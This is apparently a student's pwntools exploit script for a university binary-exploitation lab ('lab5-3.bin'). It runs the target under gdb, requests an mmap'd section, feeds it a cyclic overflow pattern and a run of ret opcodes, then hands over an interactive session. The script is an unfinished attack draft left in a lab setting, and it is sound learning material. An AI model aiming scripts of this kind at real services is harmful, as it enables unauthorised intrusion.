#!/usr/bin/python3
# 2022.09.29.0942.EST
from pwn import *

"""
gdb's search function is... finnicky
find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, END-ADDRESS, EXPR1 [, EXPR2 ...]
find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, +LENGTH, EXPR1 [, EXPR2 ...]

Can use [info proc mappings] (or really vmmap for better details) to get useful information
"""

ret = b"\xc3"
generated_section_count = 0

pattern = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak"

# Emulates the function of size_t align(size_t n) from the original c code
def align(n):
    if (n % 0x1000) != 0:
        n += 0x1000 - (n % 0x1000)
    return n

#with remote("csc748.hostbin.org", 7053) as p:
with gdb.debug("./lab5-3.bin") as p:
    payload = b""

    length = align(len(pattern))
    print("Requesting {} bytes".format(length))

    a = p.recv()    # Ignore banner
    print("a")
    print(a)
    p.send(b"1\n")    # Option 1: mmap new section on heap
    print("b")
    c = p.recv()    # Ignore reply
    print("c")
    print(c)
    p.send(pattern)    # Send a requested section length
    print("d")
    generated_section_count += 1
    print("e")
    f = p.recv()    # Ignore reply
    print("f")
    print(f)

    # Now we send length bytes to the target

    p.send(ret*length)
    print("g")

    p.interactive()
